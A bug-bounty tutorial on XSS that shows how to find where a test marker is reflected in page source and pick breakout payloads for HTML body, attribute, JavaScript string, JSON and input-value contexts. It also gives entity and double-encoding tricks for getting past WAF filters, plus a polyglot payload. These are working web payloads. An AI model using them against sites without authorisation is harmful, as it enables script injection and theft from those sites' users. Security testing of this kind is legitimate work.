# 🔍 How to Analyze Payload Execution in Page Source (Bug Bounty XSS/SSRF etc.)

## ✅ Step-by-Step Process:

### 1. Inject a Safe Test Payload
Use a harmless marker or XSS test string:
```html
vgodXSS123
```
Or:
```html
"><svg/onload=alert(1)>
```

### 2. Open Page Source or DevTools
- Right click → "View Page Source" (`Ctrl+U`)
- Or press `F12` → go to **Elements** tab for dynamic content

### 3. Search for Your Payload
Use `Ctrl+F` to find `vgodXSS123` or your payload in:
- Raw HTML source
- DOM elements (for JS-injected content)

---

## 🧬 Analyze Contexts (Know Where Your Payload Lands)

### 🔹 Context 1: Inside HTML Body
```html
<p>Hello vgodXSS123</p>
```
✅ Try breaking tags:
```html
</p><script>alert(1)</script>
```

---

### 🔹 Context 2: Inside an Attribute
```html
<img src="vgodXSS123">
```
➡️ Break out of quotes:
```html
" onerror=alert(1) x="
```

---

### 🔹 Context 3: Inside JavaScript Variable
```html
<script>var user = "vgodXSS123";</script>
```
➡️ Break string:
```js
";alert(1);//
```

---

### 🔹 Context 4: Inside HTML Comment
```html
<!-- vgodXSS123 -->
```
🟥 Cannot execute — try moving outside comment block.

---

### 🔹 Context 5: Inside Input Value
```html
<input value="vgodXSS123">
```
➡️ Use:
```html
" autofocus onfocus=alert(1) x="
```

---

### 🔹 Context 6: Script Block (JSON / JS)
```html
<script>
var data = {"user":"vgodXSS123"}
</script>
```
➡️ Try breaking with:
```js
"};alert(1);//
```

---

## 🔐 Watch for WAF/Filter Encoding
If you see:
- `<` → `&lt;`, `\u003C`, `%3C`
- `"` → `&quot;`, `\u0022`

Then:
➡️ WAF is encoding payloads → use:
```html
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

Or try **double encoding**:
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

---

## 🔁 Dynamic Injection? Check DOM!
If your payload doesn’t appear in view-source:
- Open `F12` → Elements tab
- Look for JS rendering or innerHTML injection

---

## 💡 Tips
- Use `alert(document.domain)` instead of `alert(1)`
- Use `Burp Collaborator` or `interact.sh` to detect blind hits
- Try polyglot payloads:
```html
"><svg/onload=confirm`vgod`>//
```

---

## 🧠 Summary

| Location                  | Payload Strategy                         |
|---------------------------|------------------------------------------|
| In HTML body              | Close tags + inject script               |
| In attribute              | Break quote + onerror                    |
| In JS variable            | Break string + inject JS                 |
| In input value            | Add JS events like `onfocus`, `oninput`  |
| In comment                | Try to escape or find another reflection |

---

> ✅ You’re not just injecting — you’re understanding **where and how** your input is rendered. Once you know the context, you choose the right bypass payload.
